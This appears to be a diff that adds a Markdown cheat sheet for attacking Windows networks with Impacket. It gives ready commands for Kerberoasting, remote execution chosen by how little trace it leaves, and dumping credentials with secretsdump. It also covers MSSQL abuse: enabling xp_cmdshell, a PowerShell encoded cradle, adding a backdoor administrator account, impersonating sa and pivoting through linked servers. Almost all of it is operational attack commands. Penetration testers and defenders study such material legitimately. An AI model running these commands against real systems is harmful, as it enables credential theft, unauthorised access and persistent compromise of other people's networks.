@@ -1,0 +1,123 @@
+# Impacket
+
+Collection of Python scripts for interacting with Windows protocols: covers Kerberos, remote execution, credential dumping, and AD enumeration from Linux.
+
+## Kerberos
+
+```bash
+GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request
+GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP
+getTGT.py $DOMAIN/$USER:$PASSWORD
+getST.py $DOMAIN/$USER:$PASSWORD -spn cifs/target -impersonate admin
+```
+
+## Remote Execution
+
+Pick based on noise level: psexec is loudest (creates a service), wmiexec is quieter, atexec leaves the least trace.
+
+```bash
+psexec.py $DOMAIN/$USER:$PASSWORD@$IP
+wmiexec.py $DOMAIN/$USER:$PASSWORD@$IP
+smbexec.py $DOMAIN/$USER:$PASSWORD@$IP
+atexec.py $DOMAIN/$USER:$PASSWORD@$IP "whoami"
+```
+
+## Credential Dumping
+
+```bash
+secretsdump.py $DOMAIN/$USER:$PASSWORD@$IP
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+## Enumeration
+
+```bash
+lookupsid.py $DOMAIN/$USER:$PASSWORD@$IP
+samrdump.py $DOMAIN/$USER:$PASSWORD@$IP
+rpcdump.py $IP
+```
+
+## MSSQL (mssqlclient.py)
+
+Interactive MSSQL client. Once connected, type SQL queries directly or use the built-in helpers for xp_cmdshell.
+
+### Connecting
+
+```bash
+mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP                        # SQL auth
+mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP -windows-auth          # Windows/Kerberos auth (try this first)
+mssqlclient.py $DOMAIN/$USER@$IP -hashes :$HASH -windows-auth     # PTH
+mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP -port 1433             # explicit port (default is 1433)
+```
+
+### Situational Awareness
+
+Run these immediately after connecting to understand your permissions and what's reachable.
+
+```sql
+SELECT SYSTEM_USER;                                          -- current login
+SELECT USER_NAME();                                          -- current DB user
+SELECT IS_SRVROLEMEMBER('sysadmin');                         -- 1 = you are sysadmin
+SELECT name FROM master.dbo.sysdatabases;                    -- list all databases
+SELECT name FROM master..syslogins;                          -- list all SQL logins
+EXEC sp_linkedservers;                                       -- list linked servers
+```
+
+### xp_cmdshell
+
+OS command execution via MSSQL. Requires sysadmin or equivalent. mssqlclient.py has built-in helpers that handle enabling/disabling automatically.
+
+```bash
+# Built-in helpers (preferred)
+enable_xp_cmdshell                                           # enable xp_cmdshell
+xp_cmdshell whoami                                           # run a command
+xp_cmdshell "powershell -enc <b64>"                         # PowerShell cradle
+disable_xp_cmdshell                                          # clean up after
+
+# Manual via SQL (if helpers are unavailable)
+```
+
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'net user hacker Pass123! /add';
+EXEC xp_cmdshell 'net localgroup administrators hacker /add';
+```
+
+### Impersonation
+
+If you are not sysadmin, check whether your login can impersonate one that is: this is a direct privilege escalation path.
+
+```sql
+-- Find logins you can impersonate
+SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+
+-- Impersonate a login (e.g. sa)
+EXECUTE AS LOGIN = 'sa';
+SELECT IS_SRVROLEMEMBER('sysadmin');                         -- should now return 1
+
+-- Revert back
+REVERT;
+```
+
+### Linked Server Abuse
+
+Linked servers let you run queries (and sometimes commands) on other MSSQL instances in the network, potentially with higher privileges.
+
+```sql
+-- Enumerate linked servers and their auth config
+EXEC sp_linkedservers;
+SELECT * FROM sys.servers;
+
+-- Run a query on a linked server
+SELECT * FROM OPENQUERY([$LINKED_SERVER], 'SELECT @@version');
+SELECT * FROM OPENQUERY([$LINKED_SERVER], 'SELECT SYSTEM_USER');
+SELECT * FROM OPENQUERY([$LINKED_SERVER], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+
+-- Execute xp_cmdshell on a linked server (if it has it enabled and you have rights)
+EXEC ('xp_cmdshell ''whoami''') AT [$LINKED_SERVER];
+
+-- Chain through multiple hops
+SELECT * FROM OPENQUERY([$HOP1], 'SELECT * FROM OPENQUERY([$HOP2], ''SELECT @@version'')');
+```
